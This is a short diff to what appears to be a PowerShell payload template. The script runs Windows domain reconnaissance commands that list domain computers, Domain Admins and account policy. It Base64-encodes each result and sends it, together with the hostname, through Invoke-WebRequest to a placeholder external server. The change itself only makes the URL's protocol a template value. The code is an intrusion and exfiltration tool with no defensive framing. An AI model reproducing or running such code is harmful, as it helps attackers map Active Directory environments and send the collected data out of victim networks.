@@ -45,5 +45,5 @@ DOMAIN_net_group_computers = Encode64(net group "Domain Computers" /domain)
 DOMAIN_net_group_admins = Encode64(net group "Domain Admins" /domain)
 DOMAIN_net_accounts_domain = Encode64(net accounts /domain);
 };
-$URL='https://SERVER_EXTERNAL_IP:SERVER_EXTERNAL_PORT/?';
+$URL='SERVER_PROTOCOL://SERVER_EXTERNAL_IP:SERVER_EXTERNAL_PORT/?';
 foreach($key in $commands.Keys){$enc_command=$commands[$key];$params=@{hostname=$hostname;$key=$enc_command};$headers=@{'Proof'='1'};Invoke-WebRequest -Uri $URL -Headers $headers -Method GET -Body $params;};
